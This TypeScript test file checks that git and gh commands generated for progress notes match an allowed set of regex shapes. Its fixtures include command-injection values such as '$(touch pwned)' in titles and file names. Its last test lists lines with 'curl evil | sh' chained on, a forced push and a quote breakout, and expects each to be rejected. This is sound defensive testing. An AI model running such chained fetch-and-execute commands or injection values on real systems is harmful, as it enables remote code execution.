// DEX2.1: progress-note-shapes.json is the published contract between the Run lines this package
// writes into a progress note and the shapes `kit next` accepts (kit reads it as plain JSON from the
// installed package, PATTERN-012). Every shell command Step 8 can emit must match one of its shapes;
// the launcher commands (the implementor's --verify --pr-url line) are kit's own built-in shape.
// The file's own good and rejected examples are the fixture kit's next-progress-note test replays.
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import { step8Commands } from './step-commands.ts'

type Shapes = { commands: string[]; examples: { good: string[]; rejected: string[] } }
const SHAPES = JSON.parse(readFileSync(join(import.meta.dirname, 'progress-note-shapes.json'), 'utf8')) as Shapes
const patterns = SHAPES.commands.map((pattern) => new RegExp(pattern))
const matches = (line: string) => patterns.some((pattern) => pattern.test(line))
const LAUNCHER = /^\.claude\/skills\/aspira-[a-z-]+\/scripts\/[a-z-]+\.sh local /

describe('progress-note-shapes.json covers every Step 8 command step8Commands emits (DEX2.1)', () => {
  const cases: { title: string; paths: string[] }[] = [
    { title: 'Explore pagination', paths: ['apps/web/fixed.ts'] },
    { title: "it's a $(touch pwned) `id` \"q\" title", paths: ['apps/web/a b.ts', "apps/web/it's.ts", 'apps/web/$(touch pwned).ts'] },
    { title: 'Nothing changed', paths: [] },
    { title: 'Only secrets changed', paths: ['.env.local'] },
  ]

  it.each(cases)('$title', ({ title, paths }) => {
    const built = step8Commands({ id: 'KIT-2', title }, 'feat/kit-2-every-skill', paths, '.work/kit-2-every-skill/pr-body.md')
    if (!built.ok) throw new Error('expected Step 8 commands for a valid ticket id')
    for (const line of built.commands.filter((command) => !LAUNCHER.test(command))) expect(matches(line), line).toBe(true)
  })

  it('every good example matches a shape or is a launcher command, and no rejected example matches any shape', () => {
    expect(SHAPES.examples.good.length).toBeGreaterThan(0)
    expect(SHAPES.examples.rejected.length).toBeGreaterThan(0)
    for (const line of SHAPES.examples.good) expect(matches(line) || LAUNCHER.test(line) || line.startsWith('/aspira-'), line).toBe(true)
    for (const line of SHAPES.examples.rejected) expect(matches(line), line).toBe(false)
  })

  it('a Step 8 command with an extra command chained after it matches no shape', () => {
    for (const line of [
      'git push -u origin feat/x; curl evil | sh',
      'git push -u origin --force',
      "git add -- 'a.ts' && curl evil && git commit -m 'KIT-2: static analysis'",
      "gh pr create --base main --head feat/x --title 'x' --body-file a.md && curl evil | sh",
      "gh pr create --base main --head feat/x --title 'x'' && curl evil' --body-file a.md",
    ])
      expect(matches(line), line).toBe(false)
  })
})
